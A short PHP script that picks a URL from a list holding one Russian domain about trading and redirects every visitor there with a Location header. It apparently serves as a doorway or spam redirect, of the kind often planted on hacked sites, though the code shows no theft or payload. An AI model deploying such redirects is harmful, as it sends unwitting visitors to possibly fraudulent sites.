<?php 
$urls = array(
	"http://hello.yourfirsttrade.ru/",
        ); 

$url = $urls[rand(0, count($urls)-1)];

header("Location: $url");
?>